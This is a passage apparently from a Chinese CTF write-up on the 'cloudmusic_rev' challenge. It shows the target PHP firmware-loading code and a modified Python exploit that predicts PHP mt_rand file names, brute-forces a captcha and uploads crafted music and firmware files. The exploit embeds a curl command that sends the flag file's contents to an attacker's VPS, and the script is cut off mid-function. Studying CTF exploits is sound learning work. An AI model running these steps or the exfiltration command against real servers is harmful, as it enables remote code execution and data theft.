class="keyword">if</span> ($handle==<span class="keyword">FALSE</span>)&#123;</span></span><br><span class="line"><span class="php">            ob_end_clean();</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'upload err, unknown fault.'</span>)));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $flags = fread($handle, <span class="number">4</span>);</span></span><br><span class="line"><span class="php">        fclose($handle);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($flags!==<span class="string">"\x7fELF"</span>)&#123;</span></span><br><span class="line"><span class="php">            unlink($firmware_filename);</span></span><br><span class="line"><span class="php">            ob_end_clean();</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'upload err, not a valid elf file.'</span>)));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        ob_end_clean();</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">1</span>,<span class="string">'info'</span>=&gt;<span class="string">'upload succ.'</span>)));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'CONTENT_TYPE'</span>]))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'CONTENT_TYPE'</span>],<span class="string">'form-data'</span>)!=<span class="keyword">FALSE</span>)&#123;</span></span><br><span class="line"><span class="php">            ob_end_clean();</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'upload err, maximum file size is 1MB.'</span>)));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">@$path=$_POST[<span class="string">'path'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">clean_string</span><span class="params">($str)</span></span>&#123;</span></span><br><span class="line"><span class="php">    $str=str_replace(<span class="string">"\\"</span>,<span class="string">""</span>,$str);</span></span><br><span class="line"><span class="php">    $str=str_replace(<span class="string">"/"</span>,<span class="string">""</span>,$str);</span></span><br><span class="line"><span class="php">    $str=str_replace(<span class="string">"."</span>,<span class="string">""</span>,$str);</span></span><br><span class="line"><span class="php">    $str=str_replace(<span class="string">";"</span>,<span class="string">""</span>,$str);</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> substr($str,<span class="number">0</span>,<span class="number">32</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($path))&#123;</span></span><br><span class="line"><span class="php">    $path=clean_string(trim((string) $path));</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (strlen($path)&lt;=<span class="number">0</span>||strlen($path)&gt;<span class="number">64</span>)&#123;</span></span><br><span class="line"><span class="php">        ob_end_clean();</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'Format or length check failed.'</span>)));</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $firmware_filename=<span class="keyword">__DIR__</span>.<span class="string">"/../uploads/firmware/"</span>.$path.<span class="string">".elf"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!file_exists($firmware_filename))&#123;</span></span><br><span class="line"><span class="php">            ob_end_clean();</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'File not found.'</span>)));</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">try</span>&#123;</span></span><br><span class="line">                $elf = FFI::cdef("</span><br><span class="line">                    extern char * version;</span><br><span class="line"><span class="php">                <span class="string">", $firmware_filename);</span></span></span><br><span class="line"><span class="php">                $version=(string) FFI::string($elf-&gt;version);</span></span><br><span class="line"><span class="php">                <span class="keyword">if</span> ($version === <span class="string">"cloudmusic_rev"</span>)&#123;</span></span><br><span class="line"><span class="php">                    ob_end_clean();</span></span><br><span class="line"><span class="php">                    <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">1</span>,<span class="string">'info'</span>=&gt;<span class="string">'Firmware version is cloudmusic_rev.'</span>)));</span></span><br><span class="line"><span class="php">                &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">                    ob_end_clean();</span></span><br><span class="line"><span class="php">                    <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'Bad version.'</span>)));</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"><span class="php">            &#125;<span class="keyword">catch</span>(Error $e)&#123;</span></span><br><span class="line"><span class="php">                ob_end_clean();</span></span><br><span class="line"><span class="php">                <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'Fail when loading firmware.'</span>)));</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>其中相较于1.0，代码中上传后文件名的命名方式变了</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">$firmware_filename=md5(mt_rand().$_SERVER[<span class="string">'REMOTE_ADDR'</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>即用时间和公网IP地址的MD5值来生成文件名，并且固件被加载后，执行内容不会返回。所以需要利用curl讲执行结果带出到vps上。修改原题中的exp：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line">#codin<span class="variable">g:utf</span>-<span class="number">8</span></span><br><span class="line"></span><br><span class="line">from sys import *</span><br><span class="line">from base64 import *</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">import requests</span><br><span class="line">import <span class="built_in">string</span></span><br><span class="line">import time</span><br><span class="line">import hashlib</span><br><span class="line">import random</span><br><span class="line">import json</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">timeout = <span class="number">1.0</span></span><br><span class="line">retry_count = <span class="number">5</span></span><br><span class="line">logging = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">site_url = <span class="string">''</span></span><br><span class="line">s = requests.session()</span><br><span class="line">time_zone_offset = <span class="number">60</span> * <span class="number">60</span> * <span class="number">8</span></span><br><span class="line"><span class="keyword">command</span> = <span class="string">"curl http://[your vps]/`/usr/bin/tac /fl*g*`"</span></span><br><span class="line"># <span class="keyword">command</span> = <span class="string">"ls"</span></span><br><span class="line"></span><br><span class="line">preset_key = b64decode(<span class="string">'LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUNkd0lCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQW1Fd2dnSmRBZ0VBQW9HQkFPTWp4eXVIcWRuSmFyUDAKSHl1eFVVRHkvY1BGaWMzYjM5WUQrVzY5R2VSRkpMRDUraFhaM3lYMTFBQ2pMSHpESFpIbGgrajRQZncxdEhMMApwY3FPZmJ0TTF4am5sV2FKd3lZQzRpWlBSRXJUTGNVd282UmhKS2diUkxHQVpLUmxmWFFMbVRwbGd0ZnJoUGhJCng0ZzM2ZEtLTVVlYjZnOHJ3blVrUnVYSVlhd2hBZ01CQUFFQ2dZRUEwUWZrQzFOV0pHOFFHM3ZXRThlakZ6cUgKL3RxVDd6Y2h6enJwR2RnOU02M09EbkIramcxckp1d01wbW1FVDJ6Z2tadkNiOHZFZjQ2TStoM2JWWVc4Zmg1Zwp4dTlXdmJFb0orUGZtV2R6SmowUlRYT05vZXVzRUgwODI3eGl6UXlIc21RbkNBQzkyUS9IQlg4WVl0eDgxN0pOCnNIUmNFMHdacVFmL0dkU0VnK0VDUVFEMGVjUlJYN3BsT0hTOHNjTjFqT3FOMEl5S2pvamljWWNQL2h3ckU2ZjIKZGR3dEpnNlJBb3E3SHlRdUFjYmZCazJwdS9UeDRsSHRycm9qRXlxQTRLdjdBa0VBN2RqUEFCakEvaHlpV1oxTQpDUm5DTTRudWdDUEE1SXRxZktzb3UvbE51cUdYZXFVYW5XNjBTcmJDVWJrM2g2NnkwdXV2T0xzendEWllONnNNClFEWFJrd0pBUlB3N1BtOFJ6TkF5ZUxCOHBDWUFaY1lNY21pb0RhWFZZOWpqbi9BcS9Ddmoxa1dmNUtGZi9rOWEKU1RVdEplL0VhSG5tTTM4V2VVaE5zK29MbTFSS2t3SkFNcCtyNTJ4ZFgzaSt3VzR1YWQxMnJUdVZiT2F2UHJYQgowNGttb1dPOXZKUjZSbHR2MzhSWlVYRzJ5R2d3dm90YmVuTTVsMHlaQmpkSzdZWlZsREVnU3dKQkFMb29yYmZnCkJzMW5BbGU3WnhXK0JkRXlLVG9ZUWdWVU1MRytWeDFITW9rU0dZNlh6blNFYzdpK25weFBoeGd6Q1VWdHpxNU4KR3E4Q3ppN2FJUFVuY0lnPQotLS0tLUVORCBQUklWQVRFIEtFWS0tLS0tCg=='</span>)</span><br><span class="line">preset_music = b64decode(<span class="string">'SUQzBAAAAAABBFRSQ0sAAAADAAADMQBUSVQyAAAAEgAAA2JiYmJiYmJiYmJiYmJiYmIAVEFMQgAAABIAAANjY2NjY2NjY2NjY2NjY2NjAFRQRTEAAAASAAADYWFhYWFhYWFhYWFhYWFhYQA='</span>)</span><br><span class="line">preset_firmare = b64decode(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class php_rand():</span><br><span class="line"></span><br><span class="line">    MT_RAND_MT19937 = <span class="number">0</span></span><br><span class="line">    MT_RAND_PHP = <span class="number">1</span></span><br><span class="line">    php_N = <span class="number">624</span></span><br><span class="line">    php_M = <span class="number">397</span></span><br><span class="line">    php_left = <span class="number">0</span></span><br><span class="line">    php_next = <span class="number">0</span></span><br><span class="line">    php_state = [<span class="number">0</span>] * (php_N + <span class="number">1</span>)</span><br><span class="line">    php_mode = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    def __init__(self, seed, <span class="keyword">mode</span>=<span class="number">0</span>):</span><br><span class="line">        self.php_mt_srand(seed)</span><br><span class="line">        self.php_mode = <span class="keyword">mode</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def seed(self, seed):</span><br><span class="line">        self.php_mt_srand(seed)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def rand(self):</span><br><span class="line">        <span class="keyword">return</span> self.php_mt_rand()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def hiBit(self, <span class="keyword">u</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">u</span> &amp; <span class="number">0</span>x80000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def loBit(self, <span class="keyword">u</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">u</span> &amp; <span class="number">0</span>x00000001</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def loBits(self, <span class="keyword">u</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">u</span> &amp; <span class="number">0</span>x7FFFFFFF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def mixBits(self, <span class="keyword">u</span>, v):</span><br><span class="line">        <span class="keyword">return</span> self.hiBit(<span class="keyword">u</span>) | self.loBits(v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def twist(self, <span class="keyword">m</span>, <span class="keyword">u</span>, v):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">m</span> ^ (self.mixBits(<span class="keyword">u</span>, v) &gt;&gt; <span class="number">1</span>) ^ ((-self.loBit(v)) &amp; <span class="number">0</span>x9908b0df)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def twist_php(self, <span class="keyword">m</span>, <span class="keyword">u</span>, v):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">m</span> ^ (self.mixBits(<span class="keyword">u</span>, v) &gt;&gt; <span class="number">1</span>) ^ ((-self.loBit(<span class="keyword">u</span>)) &amp; <span class="number">0</span>x9908b0df)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def php_mt_initialize(self, seed):</span><br><span class="line">        state = self.php_state</span><br><span class="line">        <span class="keyword">N</span> = self.php_N</span><br><span class="line">        state[<span class="number">0</span>] = seed &amp; <span class="number">0</span>xffffffff</span><br><span class="line">        <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">1</span>, <span class="keyword">N</span>):</span><br><span class="line">            state[i] = (<span class="number">1812433253</span> * (state[i - <span class="number">1</span>] ^ (state[i - <span class="number">1</span>] &gt;&gt; <span class="number">30</span>)) + i) &amp; <span class="number">0</span>xffffffff</span><br><span class="line">        self.php_state = state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def php_mt_reload(self):</span><br><span class="line">        self.php_left = <span class="number">0</span></span><br><span class="line">        state = self.php_state</span><br><span class="line">        <span class="keyword">N</span> = self.php_N</span><br><span class="line">        M = self.php_M</span><br><span class="line">        <span class="keyword">p</span> = <span class="number">0</span></span><br><span class="line">        i = <span class="keyword">N</span> - M</span><br><span class="line">        <span class="keyword">if</span> self.php_mode == self.MT_RAND_MT19937:</span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">                state[<span class="keyword">p</span>] = self.twist(state[<span class="keyword">p</span> + M],state[<span class="keyword">p</span> + <span class="number">0</span>],state[<span class="keyword">p</span> + <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">p</span> += <span class="number">1</span></span><br><span class="line">            i = M - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                state[<span class="keyword">p</span>] = self.twist(state[<span class="keyword">p</span>+M-<span class="keyword">N</span>],state[<span class="keyword">p</span> + <span class="number">0</span>],state[<span class="keyword">p</span> + <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">p</span> += <span class="number">1</span></span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">            state[<span class="keyword">p</span>] = self.twist(state[<span class="keyword">p</span> + M - <span class="keyword">N</span>],state[<span class="keyword">p</span> + <span class="number">0</span>],state[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">                state[<span class="keyword">p</span>] = self.twist_php(state[<span class="keyword">p</span> + M],state[<span class="keyword">p</span> + <span class="number">0</span>],state[<span class="keyword">p</span> + <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">p</span> += <span class="number">1</span></span><br><span class="line">            i = M - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                state[<span class="keyword">p</span>] = self.twist_php(state[<span class="keyword">p</span> + M - <span class="keyword">N</span>],state[<span class="keyword">p</span> + <span class="number">0</span>],state[<span class="keyword">p</span> + <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">p</span> += <span class="number">1</span></span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">            state[<span class="keyword">p</span>] = self.twist_php(state[<span class="keyword">p</span> + M - <span class="keyword">N</span>],state[<span class="keyword">p</span> + <span class="number">0</span>],state[<span class="number">0</span>])</span><br><span class="line">        self.php_left = <span class="keyword">N</span></span><br><span class="line">        self.php_next = <span class="number">0</span></span><br><span class="line">        self.php_state = state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def php_mt_srand(self, seed):</span><br><span class="line">        self.php_mt_initialize(seed)</span><br><span class="line">        self.php_mt_reload()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def php_mt_rand(self):</span><br><span class="line">        <span class="keyword">if</span> self.php_left == <span class="number">0</span>: self.php_mt_reload()</span><br><span class="line">        self.php_left -= <span class="number">1</span></span><br><span class="line">        s1 = self.php_state[self.php_next]</span><br><span class="line">        s1 ^= (s1 &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        s1 ^= (s1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0</span>x9d2c5680</span><br><span class="line">        s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0</span>xefc60000</span><br><span class="line">        self.php_next += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> ( s1 ^ (s1 &gt;&gt; <span class="number">18</span>)) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># <span class="built_in">get</span> random <span class="built_in">string</span></span><br><span class="line">def rand_str(length=<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.<span class="keyword">join</span>(random.sample(<span class="built_in">string</span>.ascii_letters + <span class="built_in">string</span>.digits, length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># <span class="built_in">get</span> method</span><br><span class="line">def <span class="built_in">get</span>(session, url):</span><br><span class="line">    retry = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        retry += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> session:</span><br><span class="line">                r = s.<span class="built_in">get</span>(url, timeout=timeout)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r = requests.<span class="built_in">get</span>(url, timeout=timeout)</span><br><span class="line">        excep<span class="variable">t:</span></span><br><span class="line">            <span class="keyword">if</span> retry &gt;= retry_coun<span class="variable">t:</span></span><br><span class="line">                <span class="keyword">print</span>(<span class="string">'timeout or http 500'</span>)</span><br><span class="line">                <span class="keyword">exit</span>()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"># post method</span><br><span class="line">def post(session, url, data, <span class="keyword">files</span>=<span class="string">''</span>):</span><br><span class="line">    retry = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        retry += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> session:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">files</span>==<span class="string">''</span>:</span><br><span class="line">                    r = s.post(url, data=data, timeout=timeout)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r = s.post(url, data=data, <span class="keyword">files</span>=<span class="keyword">files</span>, timeout=timeout)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">files</span>==<span class="string">''</span>:</span><br><span class="line">                    r = requests.post(url, data=data, timeout=timeout)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r = requests.post(url, data=data, <span class="keyword">files</span>=<span class="keyword">files</span>, timeout=timeout)</span><br><span class="line">        excep<span class="variable">t:</span></span><br><span class="line">            <span class="keyword">if</span> retry &gt;= retry_coun<span class="variable">t:</span></span><br><span class="line">                <span class="keyword">print</span>(<span class="string">'timeout or http 500'</span>)</span><br><span class="line">                <span class="keyword">exit</span>()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"># login with username <span class="built_in">and</span> password</span><br><span class="line">def login(username, password):</span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=login'</span></span><br><span class="line">    data = &#123;<span class="string">'username'</span>: username, <span class="string">'password'</span>: password&#125;</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(url)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(data)</span><br><span class="line">    <span class="keyword">res</span> = post(<span class="number">1</span>, url, data)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="keyword">res</span>.text)</span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=upload'</span></span><br><span class="line">    <span class="keyword">res</span> = <span class="built_in">get</span>(<span class="number">1</span>, url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'fileuploaded'</span> not in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line">    <span class="keyword">return</span> True</span><br><span class="line"></span><br><span class="line"># <span class="keyword">reg</span> with username <span class="built_in">and</span> password</span><br><span class="line">def <span class="keyword">reg</span>(username, password):</span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=reg'</span></span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(url)</span><br><span class="line">    <span class="keyword">res</span> = <span class="built_in">get</span>(<span class="number">1</span>, url)</span><br><span class="line">    show_code = <span class="string">''</span></span><br><span class="line">    show_calc = <span class="string">''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        show_code = <span class="keyword">res</span>.text.<span class="keyword">split</span>(<span class="string">'show_code"&gt;'</span>)[<span class="number">1</span>].<span class="keyword">split</span>(<span class="string">'&lt;'</span>)[<span class="number">0</span>]</span><br><span class="line">        show_calc = <span class="keyword">res</span>.text.<span class="keyword">split</span>(<span class="string">'show_calc"&gt;'</span>)[<span class="number">1</span>].<span class="keyword">split</span>(<span class="string">'&lt;'</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="built_in">len</span>(show_calc))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(show_calc) != <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'invalid show_calc length'</span>)</span><br><span class="line">            <span class="keyword">return</span> False</span><br><span class="line">    excep<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="string">"show_code"</span>,show_code)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="string">"show_calc"</span>,show_calc)</span><br><span class="line">    code = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100000000</span>):</span><br><span class="line">        code = str(i)</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(code + show_code).hexdigest()[:<span class="number">6</span>] == show_calc.lower(): <span class="keyword">break</span></span><br><span class="line">    data = &#123;<span class="string">'username'</span>: username, <span class="string">'password1'</span>: password, <span class="string">'password2'</span>: password, <span class="string">'code'</span>: code&#125;</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(data)</span><br><span class="line">    <span class="keyword">res</span> = post(<span class="number">1</span>, url, data)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="keyword">res</span>.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">return</span> True</span><br><span class="line">    <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line"># upload music [diff]</span><br><span class="line">def upload_music():</span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=upload'</span></span><br><span class="line">    data = &#123;<span class="string">'file_id'</span>: <span class="string">'0'</span>&#125;</span><br><span class="line">    music = preset_music[:<span class="number">0</span>x6] + <span class="string">'\x00\x00\x03\x00'</span> + preset_music[<span class="number">0</span>x0<span class="variable">a:0x53</span>]</span><br><span class="line">    music += <span class="string">'\x00\x00\x03\x00'</span> + <span class="string">'\x00\x00\x03'</span> + <span class="string">'a'</span> * <span class="number">0</span>x70 + <span class="string">'\x00'</span></span><br><span class="line">    <span class="keyword">files</span> = &#123;<span class="string">'file_data'</span>: music&#125;</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(url)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(data)</span><br><span class="line">    <span class="keyword">res</span> = post(<span class="number">1</span>, url, data, <span class="keyword">files</span>)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="keyword">res</span>.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            # n54LuyJyYLVpVO2w</span><br><span class="line">            <span class="keyword">return</span> b64decode(json.loads(<span class="keyword">res</span>.content.strip())[<span class="string">'artist'</span>])[:<span class="number">16</span>]</span><br><span class="line">        excep<span class="variable">t:</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"># upload firmware [diff]</span><br><span class="line">def upload_firmware(<span class="keyword">command</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="keyword">command</span>) &gt; <span class="number">0</span>x100: <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=firmware'</span></span><br><span class="line">    data = &#123;<span class="string">'file_id'</span>: <span class="string">'0'</span>&#125;</span><br><span class="line">    <span class="keyword">command</span> = <span class="keyword">command</span>.ljust(<span class="number">0</span>x100, <span class="string">'\x00'</span>)</span><br><span class="line">    firmware = preset_firmare.replace(<span class="string">'a'</span> * <span class="number">0</span>x100, <span class="keyword">command</span>)</span><br><span class="line">    <span class="keyword">files</span> = &#123;<span class="string">'file_data'</span>: firmware&#125;</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(url)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(data)</span><br><span class="line">    <span class="keyword">res</span> = post(<span class="number">1</span>, url, data, <span class="keyword">files</span>)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="string">"Upload: "</span> + <span class="keyword">res</span>.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Date'</span> in <span class="keyword">res</span>.headers.<span class="built_in">keys</span>():</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">"Date Header: "</span> + <span class="keyword">res</span>.headers[<span class="string">'Date'</span>])</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">int</span>(datetime.strptime(<span class="keyword">res</span>.headers[<span class="string">'Date'</span>], <span class="string">"%a, %d %b %Y %X %Z"</span>).<span class="built_in">strftime</span>(<span class="string">"%s"</span>)) + time_zone_offset</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">int</span>(time.time())</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"># <span class="built_in">get</span> firmware <span class="keyword">version</span></span><br><span class="line">def firmware_version(path):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(path)&gt;<span class="number">0</span>x40: <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=firmware'</span></span><br><span class="line">    data = &#123;<span class="string">'path'</span>: path&#125;</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(url)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(data)</span><br><span class="line">    <span class="keyword">res</span> = post(<span class="number">1</span>, url, data)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="keyword">res</span>.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> json.loads(<span class="keyword">res</span>.content.strip())[<span class="string">'info'</span>]</span><br><span class="line">        excep<span class="variable">t:</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"># show result</span><br><span class="line">def show_result(vuln1, vuln2, msg):</span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> vuln1 == -<span 